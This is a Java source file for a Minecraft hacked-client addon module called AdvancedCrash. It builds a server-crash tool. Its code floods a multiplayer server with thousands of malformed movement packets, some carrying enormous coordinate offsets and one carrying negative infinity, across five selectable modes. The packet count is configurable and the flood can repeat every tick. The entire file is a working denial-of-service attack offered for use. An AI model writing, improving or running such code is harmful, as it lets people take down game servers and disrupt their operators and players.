package com.crystaldevs.crystal.modules.crash;

import com.crystaldevs.crystal.CrystalAddon;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

public class AdvancedCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Modes> crashMode = sgGeneral.add(new EnumSetting.Builder<Modes>()
            .name("mode")
            .description("Which crash mode to use.")
            .defaultValue(Modes.NEW)
            .build()
    );

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("How many packets to send to the server.")
            .defaultValue(5000)
            .sliderRange(100, 10000)
            .build()
    );

    private final Setting<Boolean> onTick = sgGeneral.add(new BoolSetting.Builder()
            .name("on-tick")
            .description("Sends the packets every tick.")
            .defaultValue(false)
            .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("auto-disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build()
    );

    public AdvancedCrash() {
        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY, "advanced-crash", "CRYSTAL || A newly developed crash method.");
    }

    @EventHandler
    public void onTick(TickEvent.Pre tickEvent) {
        switch (crashMode.get()) {
            case NEW -> {
                for (int i = 0; i < amount.get(); i++)
                    mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                            mc.player.getX() + (9412 * i),
                            mc.player.getY() + (9412 * i),
                            mc.player.getZ() + (9412 * i),
                            true));
            }
            case OTHER -> {
                for (int i = 0; i < amount.get(); i++)
                    mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                            mc.player.getX() + (500000 * i),
                            mc.player.getY() + (500000 * i),
                            mc.player.getY() + (500000 * i),
                            true));
            }
            case OLD -> {
                for (int i = 0; i < amount.get(); i++)
                    mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                            Double.NEGATIVE_INFINITY,
                            Double.NEGATIVE_INFINITY,
                            Double.NEGATIVE_INFINITY,
                            true));
            }
            case EFFICIENT -> {
                for (int i = 0; i < amount.get(); i++)
                    mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                            mc.player.getX() + (833333 * i),
                            mc.player.getY() + (833333 * i),
                            mc.player.getZ() + (833333 * i),
                            true));
            }
            case FULL -> {
                for (int i = 0; i < amount.get(); i++)
                    mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(
                            mc.player.getX() + (833333 * i),
                            mc.player.getY() + (833333 * i),
                            mc.player.getZ() + (833333 * i),
                            mc.player.getYaw() + (83333 * i),
                            mc.player.getPitch() + (83333 * i),
                            true));
            }
        }
        if (!onTick.get()) toggle();
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    public enum Modes {
        EFFICIENT,
        FULL,
        NEW,
        OLD,
        OTHER
    }
}